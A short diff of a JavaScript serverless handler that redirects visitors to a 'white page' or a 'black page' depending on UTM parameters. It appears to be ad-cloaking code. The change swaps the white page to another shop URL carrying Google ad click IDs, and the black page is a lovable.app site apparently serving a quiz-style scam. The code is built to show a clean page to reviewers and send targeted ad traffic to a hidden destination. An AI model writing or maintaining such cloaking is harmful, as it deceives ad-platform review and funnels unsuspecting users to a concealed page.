@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.davidlocco.com/products/essentials-nine-ring?variant=52817858494794";
+    const whitePageURL = "https://www.beyaly.com/?gad_source=1&gad_campaignid=22309687434&gbraid=0AAAAApylhvS0xPDiFIkMa7fR7dqBIdkj4&gclid=CjwKCAjwjffHBhBuEiwAKMb8pCHX0fR-n6PZLucJXSdRuHqPQgD3BPqfCx6bKiXDKuH1kq3OPnyIlxoC7CcQAvD_BwE";
     const blackPageURL = "https://instentquzzz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,4 +26,5 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
